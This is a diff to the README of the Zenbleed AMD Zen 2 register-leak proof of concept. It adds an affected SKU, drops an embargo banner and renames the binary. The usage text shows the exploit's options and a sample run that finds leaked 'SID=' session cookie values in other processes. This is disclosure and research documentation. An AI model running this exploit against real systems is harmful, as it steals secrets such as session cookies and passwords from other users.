@@ -29,6 +29,7 @@ We have confirmed this bug is reproducible on at least the following SKUs:
 - `AMD Ryzen Threadripper PRO 3945WX 12-Cores`
 - `AMD Ryzen 7 PRO 4750GE with Radeon Graphics`
 - `AMD Ryzen 7 5700U`
+- `AMD Ryzen 7 4800h`
 - `AMD EPYC 7B12`
 
 In general, we believe all Zen 2 processors are affected, including "Rome"
@@ -85,12 +86,11 @@ Please type `make` to build the testcase.
 
 ```
 $ ./zenbleed -h
-*** EMBARGOED SECURITY ISSUE --  DO NOT DISTRIBUTE! ***
 ZenBleed Testcase -- taviso@google.com
 
 NOTE: Try -h to see configuration options
 
-Usage: ./zenleak [OPTIONS]
+Usage: ./zenbleed [OPTIONS]
    -v N    Select a variant leak kernel, different kernels work better on different SKUs.
    -m N    Stop after leaking N values, useful for benchmarking.
    -H N    Spawn a 'hammer' thread on core N, produces recognizable values for testing.
@@ -112,7 +112,7 @@ For example, a command like `while true; do sort < /etc/passwd > /dev/null; done
 This should generate some recognizable register throughput, like this:
 
 ```
-$ ./zenleak
+$ ./zenbleed
 Thread 0x7f26b92346c0 running on CPU 0
 Thread 0x7f26b8a336c0 running on CPU 2
 Thread 12: "999:999:systemd "
@@ -169,7 +169,7 @@ registers for a string that looks like that. As it learns more of the string
 that follows, it will extend the search to continue the pattern.
 
 ```
-$ ./zenleak -q -p "SID="
+$ ./zenbleed -q -p "SID="
 SID=cieX4meceechoo2UThooh5uu; 1P_JAR=2023-05-17-21; S^C
 ```
 
